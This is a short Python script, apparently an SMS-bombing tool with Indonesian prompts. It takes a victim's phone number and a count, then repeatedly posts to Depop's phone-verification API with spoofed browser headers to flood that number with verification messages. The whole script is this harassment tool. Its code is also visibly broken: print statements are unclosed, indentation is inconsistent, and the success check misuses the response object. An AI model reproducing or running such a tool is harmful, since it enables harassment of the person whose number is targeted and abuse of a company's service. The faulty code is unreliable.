import json
import requests
import sys
import os


def main():
                os.system('clear')
                os.system('figlet LzGame')
                banner='''

        [+]AUTHOR :Lz Game
        [+]Youtube : LzGame
        '''
         
        print(banner)
        no = input('target :  ')
        jum = input('jumlah spam :  ')
        
        head = {
        "User-Agent":" Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36",
        "referer":" https://signup.depop.com/",
        "Host":"bapi.depop.com",
        }
        
        dat = {
        'phone'  :  no
        }
        
        for x in range(int(jum)):
                    leosureo = requests.post("https://webapi.depop.com/api/v1/auth/verify/phone", headers=head, json=dat)
        if  'eror' in leosureo:
                 print('gagal mengirim'   +  no
        else:
                 print('sukses mengirim'  +  no
                 
                 
                 
main()
